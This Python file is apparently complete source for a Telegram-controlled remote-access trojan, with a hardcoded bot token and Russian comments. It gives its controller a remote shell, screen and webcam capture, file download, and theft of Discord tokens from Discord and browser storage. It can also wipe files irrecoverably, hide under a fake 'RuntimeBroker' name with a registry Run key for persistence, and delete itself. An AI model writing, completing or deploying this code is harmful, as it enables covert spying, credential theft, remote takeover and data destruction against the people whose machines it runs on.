# language: Python 3.10+, file: agent_tg.py
# pip install pyTelegramBotAPI mss pillow opencv-python-headless psutil requests pycryptodome

import os
import sys
import time
import json
import base64
import shutil
import sqlite3
import platform
import subprocess
import tempfile
import threading
import io
from pathlib import Path

import telebot
import mss
from PIL import Image
import cv2
import psutil
import requests
from Crypto.Cipher import AES

BOT_TOKEN = "9156482156:AAE2Wt7l2dPVyhDLZHD20h94RXFNmmxZk-Y"
ADMIN_CHAT_ID = None          # заполнится автоматически при первом /start от тебя
ALLOWED = set()

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

def is_admin(msg):
    if ADMIN_CHAT_ID is None:
        return True
    return msg.from_user.id == ADMIN_CHAT_ID or msg.from_user.id in ALLOWED

def sys_info():
    uname = platform.uname()
    try:
        ip = requests.get("https://api.ipify.org", timeout=4).text
    except:
        ip = "n/a"
    return (
        f"<b>Host:</b> {uname.node}\n"
        f"<b>OS:</b> {uname.system} {uname.release}\n"
        f"<b>User:</b> {os.getenv('USERNAME') or os.getenv('USER')}\n"
        f"<b>IP:</b> {ip}\n"
        f"<b>PID:</b> {os.getpid()}"
    )

# ---------- Discord token ----------
def get_discord_tokens():
    tokens = set()
    paths = []

    # Discord desktop
    appdata = os.getenv("APPDATA")
    local = os.getenv("LOCALAPPDATA")
    if appdata:
        paths += [
            Path(appdata) / "discord" / "Local Storage" / "leveldb",
            Path(appdata) / "discordcanary" / "Local Storage" / "leveldb",
            Path(appdata) / "discordptb" / "Local Storage" / "leveldb",
        ]
    if local:
        paths += [
            Path(local) / "Google" / "Chrome" / "User Data" / "Default" / "Local Storage" / "leveldb",
            Path(local) / "Microsoft" / "Edge" / "User Data" / "Default" / "Local Storage" / "leveldb",
            Path(local) / "BraveSoftware" / "Brave-Browser" / "User Data" / "Default" / "Local Storage" / "leveldb",
        ]

    for p in paths:
        if not p.exists():
            continue
        for f in p.glob("*.ldb"):
            try:
                data = f.read_bytes()
                # простой поиск токенов (mfa. / обычные)
                import re
                found = re.findall(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", data)
                for t in found:
                    tokens.add(t.decode(errors="ignore"))
            except:
                pass
    return list(tokens)

# ---------- Webcam ----------
def webcam_shot():
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None
    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
    return buf.tobytes()

# ---------- Screen ----------
def screen_shot():
    with mss.mss() as sct:
        mon = sct.monitors[0]
        shot = sct.grab(mon)
        img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=65)
        return buf.getvalue()

# ---------- Wipe ----------
def wipe_path(target: str, secure=False):
    """Безвозвратно затирает файлы (перезапись нулями + удаление)."""
    target = Path(target)
    if not target.exists():
        return "path not found"
    count = 0
    try:
        if target.is_file():
            if secure:
                size = target.stat().st_size
                with open(target, "ba+", buffering=0) as f:
                    f.write(b"\x00" * size)
            target.unlink()
            count = 1
        else:
            for root, dirs, files in os.walk(target, topdown=False):
                for name in files:
                    fp = Path(root) / name
                    try:
                        if secure:
                            size = fp.stat().st_size
                            with open(fp, "ba+", buffering=0) as f:
                                f.write(b"\x00" * min(size, 64 * 1024 * 1024))  # до 64 МБ
                        fp.unlink()
                        count += 1
                    except:
                        pass
                for name in dirs:
                    try:
                        (Path(root) / name).rmdir()
                    except:
                        pass
            try:
                target.rmdir()
            except:
                pass
        return f"wiped {count} files"
    except Exception as e:
        return f"wipe error: {e}"

# ---------- Persistence ----------
def persist():
    try:
        if sys.platform == "win32":
            dest = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "RuntimeBroker.pyw"
            if not dest.exists():
                shutil.copy2(sys.argv[0], dest)
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "RuntimeBroker", 0, winreg.REG_SZ, f'pythonw "{dest}"')
            winreg.CloseKey(key)
            return "persist OK"
        return "only Windows for now"
    except Exception as e:
        return str(e)

# ======================== COMMANDS ========================

@bot.message_handler(commands=["start", "help"])
def cmd_start(msg):
    global ADMIN_CHAT_ID
    if ADMIN_CHAT_ID is None:
        ADMIN_CHAT_ID = msg.from_user.id
        ALLOWED.add(ADMIN_CHAT_ID)
        bot.reply_to(msg, f"Admin set: {ADMIN_CHAT_ID}\n{sys_info()}")
    if not is_admin(msg):
        return
    text = (
        "/info\n"
        "/shell <cmd>\n"
        "/screen — скрин монитора\n"
        "/webcam — фото с камеры\n"
        "/discord — токены Discord\n"
        "/wipe <path> — снос (пример: /wipe C:\\Users\\User\\Desktop)\n"
        "/wipe_secure <path> — с перезаписью нулями\n"
        "/download <path>\n"
        "/ls [path]\n"
        "/cd <path>\n"
        "/pwd\n"
        "/persist\n"
        "/selfdestruct"
    )
    bot.reply_to(msg, text)

@bot.message_handler(commands=["info"])
def cmd_info(msg):
    if not is_admin(msg): return
    bot.reply_to(msg, sys_info())

@bot.message_handler(commands=["shell"])
def cmd_shell(msg):
    if not is_admin(msg): return
    cmd = msg.text[6:].strip()
    if not cmd:
        bot.reply_to(msg, "usage: /shell whoami")
        return
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90)
        out = (r.stdout or "") + (r.stderr or "") or "(empty)"
        for i in range(0, len(out), 3900):
            bot.send_message(msg.chat.id, f"<pre>{out[i:i+3900]}</pre>")
    except Exception as e:
        bot.reply_to(msg, str(e))

@bot.message_handler(commands=["screen"])
def cmd_screen(msg):
    if not is_admin(msg): return
    try:
        data = screen_shot()
        bot.send_photo(msg.chat.id, data, caption="screen")
    except Exception as e:
        bot.reply_to(msg, str(e))

@bot.message_handler(commands=["webcam"])
def cmd_webcam(msg):
    if not is_admin(msg): return
    data = webcam_shot()
    if data:
        bot.send_photo(msg.chat.id, data, caption="webcam")
    else:
        bot.reply_to(msg, "camera not available")

@bot.message_handler(commands=["discord"])
def cmd_discord(msg):
    if not is_admin(msg): return
    tokens = get_discord_tokens()
    if not tokens:
        bot.reply_to(msg, "no tokens found")
        return
    text = "\n".join(tokens)
    bot.reply_to(msg, f"<pre>{text}</pre>")

@bot.message_handler(commands=["wipe"])
def cmd_wipe(msg):
    if not is_admin(msg): return
    path = msg.text[5:].strip().strip('"')
    if not path:
        bot.reply_to(msg, "usage: /wipe C:\\path")
        return
    bot.reply_to(msg, wipe_path(path, secure=False))

@bot.message_handler(commands=["wipe_secure"])
def cmd_wipe_secure(msg):
    if not is_admin(msg): return
    path = msg.text[12:].strip().strip('"')
    if not path:
        bot.reply_to(msg, "usage: /wipe_secure C:\\path")
        return
    bot.reply_to(msg, wipe_path(path, secure=True))

@bot.message_handler(commands=["download"])
def cmd_download(msg):
    if not is_admin(msg): return
    path = msg.text[9:].strip().strip('"')
    if not path or not os.path.isfile(path):
        bot.reply_to(msg, "file not found")
        return
    with open(path, "rb") as f:
        bot.send_document(msg.chat.id, f)

@bot.message_handler(commands=["ls"])
def cmd_ls(msg):
    if not is_admin(msg): return
    path = msg.text[3:].strip() or os.getcwd()
    try:
        items = os.listdir(path)[:60]
        bot.reply_to(msg, f"<pre>{path}\n" + "\n".join(items) + "</pre>")
    except Exception as e:
        bot.reply_to(msg, str(e))

@bot.message_handler(commands=["cd"])
def cmd_cd(msg):
    if not is_admin(msg): return
    try:
        os.chdir(msg.text[3:].strip())
        bot.reply_to(msg, os.getcwd())
    except Exception as e:
        bot.reply_to(msg, str(e))

@bot.message_handler(commands=["pwd"])
def cmd_pwd(msg):
    if not is_admin(msg): return
    bot.reply_to(msg, os.getcwd())

@bot.message_handler(commands=["persist"])
def cmd_persist(msg):
    if not is_admin(msg): return
    bot.reply_to(msg, persist())

@bot.message_handler(commands=["selfdestruct"])
def cmd_die(msg):
    if not is_admin(msg): return
    bot.reply_to(msg, "bye")
    try:
        os.remove(sys.argv[0])
    except:
        pass
    os._exit(0)

# ==========================================================

if __name__ == "__main__":
    try:
        bot.send_message(ADMIN_CHAT_ID or 0, f"agent online\n{sys_info()}")
    except:
        pass
    print("[*] agent polling...")
    bot.infinity_polling(timeout=40, long_polling_timeout=40)